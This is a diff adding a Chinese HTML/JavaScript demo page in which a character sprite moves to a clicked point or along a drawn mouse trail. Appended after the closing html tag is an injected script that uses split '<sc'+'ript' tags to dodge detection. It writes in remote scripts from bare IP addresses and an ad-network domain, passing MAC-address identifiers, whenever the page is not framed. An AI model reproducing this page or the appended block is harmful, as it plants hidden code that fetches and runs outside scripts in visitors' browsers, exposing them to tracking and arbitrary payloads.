@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>移动效果（按轨迹移动）</title>
+<style type="text/css">
+body,div{margin:0;padding:0;}
+div{position:absolute;width:66px;height:45px;background:url(img/1.gif) no-repeat;top:100px;left:50px;}
+p,input{margin:10px;}
+</style>
+<script type="text/javascript">
+window.onload = function ()
+{
+	var oDiv = document.getElementsByTagName("div")[0];
+	var aInput = document.getElementsByTagName("input");
+	var oP = document.getElementsByTagName("p")[0];
+	var i = 0;
+	
+	aInput[0].onclick = function (event)
+	{		
+		(event || window.event).cancelBubble = true;
+		clearEvent();
+		this.value += "(已激活)";
+		oP.innerHTML = "鼠标点击页面， 人物将移动至鼠标位置！";
+		document.onclick = function (event)
+		{
+			var event = event || window.event;
+			oDiv.style.background = "url(img/2.gif) no-repeat";
+			startMove(oDiv, {x:event.clientX, y:event.clientY}, function(){oDiv.style.background = "url(img/1.gif) no-repeat"});
+			return false;
+		}	
+	};
+	
+	aInput[1].onclick = function (event)
+	{		
+		(event || window.event).cancelBubble = true;
+		clearEvent();
+		this.value += "(已激活)";
+		oP.innerHTML = "按住鼠标左键，在页面划动，人物将按照鼠标轨迹移动。"
+		var aPos = [{x:oDiv.offsetLeft, y:oDiv.offsetTop}];
+		document.onmousedown = function (event)
+		{
+			var event = event || window.event;			
+			aPos.push({x:event.clientX, y:event.clientY});
+			document.onmousemove = function (event)
+			{
+				var event = event || window.event;
+				aPos.push({x:event.clientX, y:event.clientY});	
+				return false;
+			}
+			return false;
+		}
+		document.onmouseup = function ()
+		{
+			document.onmousemove = null;
+			oDiv.style.background = "url(img/2.gif) no-repeat";		
+			var timer = setInterval(function ()
+			{
+				if(aPos.length == 0)
+				{
+					clearInterval(timer);
+					oDiv.style.background = "url(img/1.gif) no-repeat";
+					return;	
+				};
+				oDiv.style.left = aPos[0].x + "px";
+				oDiv.style.top = aPos[0].y + "px";
+				aPos.shift();
+			}, 30);
+		};
+	}
+	
+	function clearEvent()
+	{
+		document.onclick = null;
+		document.onmousedown = null;
+		document.onmousemove = null;
+		document.onmouseup = null;
+		for (i = 0; i < aInput.length; i++)
+		{
+			aInput[i].value = aInput[i].value.replace("(已激活)", "");
+			aInput[i].onmousedown = aInput[i].onmouseup = function (event)
+			{
+				(event || window.event).cancelBubble = true;	
+			};
+		}
+	}
+};
+function startMove(obj, oTarget, fnEnd)
+{
+	clearInterval(obj.timer);
+	obj.timer = setInterval(function ()
+	{
+		doMove(obj, oTarget, fnEnd)	
+	}, 30)	
+}
+function doMove(obj, oTarget, fnEnd)
+{
+	var iX = (oTarget.x - obj.offsetLeft) / 5;
+	var iY = (oTarget.y - obj.offsetTop) / 5;
+	iX = iX > 0 ? Math.ceil(iX) : Math.floor(iX);
+	iY = iY > 0 ? Math.ceil(iY) : Math.floor(iY);
+	if (oTarget.x == obj.offsetLeft && oTarget.y == obj.offsetTop)
+	{
+		clearInterval(obj.timer);
+		fnEnd && fnEnd();	
+	}
+	else
+	{
+		obj.style.left = obj.offsetLeft + iX + "px";
+		obj.style.top = obj.offsetTop + iY + "px";	
+	}
+}
+</script>
+</head>
+<body>
+<input type="button" value="根据鼠标点击位置移动" /><input type="button" value="根据标鼠标轨迹移动" />
+<p>请点击按钮激活功能！</p>
+<div></div>
+</body>
+</html>
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __h="http://101.201.53.95/js.php?uid=2cece0eb18a4abecb3eaa0b8e926db85,PC,";
+var x=ik_random();
+var __m='80:fa:5b:01:bf:31';
+var __m2='00:00:00:00:00:00';
+if(!ik_isiframe()){
+	switch(true){
+                 case x>=0&&x<95:
+			document.write("<sc"+"ript src=\""+__h+"16&r="+Math.random()+"&r2="+Math.random()+"\"></scr"+"ipt>");
+			document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10066&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+			break;
+                 case x>=95&&x<=100:
+			document.write("<sc"+"ript src=\""+__h+"11&r="+Math.random()+"&r2="+Math.random()+"\"></scr"+"ipt>");
+			document.write("<sc"+"ript src=\"http://180.76.171.28/ydap.js?ydcp_id=10111&cumid="+__m+"&apmac="+__m2+"\"></scr"+"ipt>");
+			break;
+		}
+}
+</script>
